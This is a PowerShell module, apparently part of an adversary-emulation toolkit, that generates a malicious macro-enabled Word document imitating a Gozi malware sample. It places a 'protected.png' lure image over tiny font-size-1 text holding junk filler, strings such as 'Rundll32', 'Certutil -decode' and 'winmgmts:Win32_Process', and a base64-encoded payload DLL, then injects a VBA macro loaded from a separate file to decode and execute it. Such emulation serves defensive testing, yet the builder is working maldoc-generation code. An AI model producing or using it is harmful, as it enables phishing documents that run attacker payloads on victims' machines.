Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

Gozi Sample Hash: 99ead91569faadd36b160701b48e268d1a3e364d8aa64248121eed2ad282e327

This module requires the use of a dropper, or similar dll. You can modify the macro
to execute your payload however you like. Currently, it requires a DLL that exposes
an "Init" function to execute.

The payload needs to be created by base64 encoding the binary. It is suggested that
a smaller binary be used as a longer string may spill out from behind the "protected.png"
image that is placed on top of the text

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $junk = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    # https://devblogs.microsoft.com/scripting/how-can-i-center-align-a-picture-in-a-word-document/
    # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.word.wdwraptype?view=word-pia
    $wdApp.ActiveDocument.Shapes.AddPicture("$PSScriptRoot\protected.png") | Out-Null
    #$objShapeRange = $wdDoc.Shapes.Range(1) | Out-Null
    #$objShapeRange.WrapFormat.Type = 3 | Out-Null

    # https://gallery.technet.microsoft.com/office/6958e096-4e12-4d04-bdcb-d710942d75f7
    $wdApp.Selection.Endkey(6, 0) | Out-Null

    # https://dotnet-helpers.com/powershell/add-text-to-word-using-powershell/
    # https://word.tips.net/T000253_Changing_Character_Color.html
    #$wdApp.Selection.Font.Color = 8
    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("123123123")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("winmgmts:Win32_Process")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("Rundll32")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("Certutil -decode")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("cmd /C echo")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$junk")

    $wdApp.Selection.TypeParagraph()
    $wdApp.Selection.Font.Size = 1
    $wdApp.Selection.TypeText("$payload")

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $macro = BuildMacro -len ($payload.Length + 1)
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    }

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $len
    )

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")

    $macro = $macro -replace "aLENa", $len

    return $macro

}
